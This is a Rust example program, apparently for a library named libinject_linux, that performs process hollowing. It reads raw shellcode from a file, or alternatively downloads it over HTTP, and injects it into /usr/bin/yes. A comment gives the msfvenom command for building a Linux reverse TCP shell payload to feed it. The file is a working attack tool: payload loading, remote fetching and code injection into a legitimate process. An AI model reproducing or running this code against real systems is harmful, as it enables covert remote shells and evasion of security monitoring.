#![allow(unused_variables, dead_code)]
use libinject_linux::hollow;

use std::env::current_dir;
use std::fs;

fn main() {
    let path = current_dir().unwrap();
    let cwd = path.display();

    // Shellcode:
    // msfvenom --payload 'linux/x64/shell_reverse_tcp' LHOST=127.0.0.1 LPORT=1234 --format 'raw' --platform 'linux' --arch 'x64' --out shellcode.bin
    let shellcode_location = format!("{}/shellcode.bin", cwd);
    let shellcode_bytes = get_binary_filesystem(&shellcode_location);
    // let shellcode_location = "http://127.0.0.1:8081/shellcode.bin";
    // let shellcode_bytes = get_binary_http(shellcode_location);

    let target = "/usr/bin/yes";

    match hollow(target, "", &shellcode_bytes) {
        Ok(res) => res,
        Err(error) => panic!("An error occured: {error:?}"),
    };
}

fn get_binary_filesystem(path: &str) -> Vec<u8> {
    fs::read(path).expect("Faild to open file")
}

fn get_binary_http(url: &str) -> Vec<u8> {
    let response = ureq::get(url).call().unwrap();

    let mut bytes: Vec<u8> = Vec::new();

    response.into_reader().read_to_end(&mut bytes).unwrap();

    bytes
}
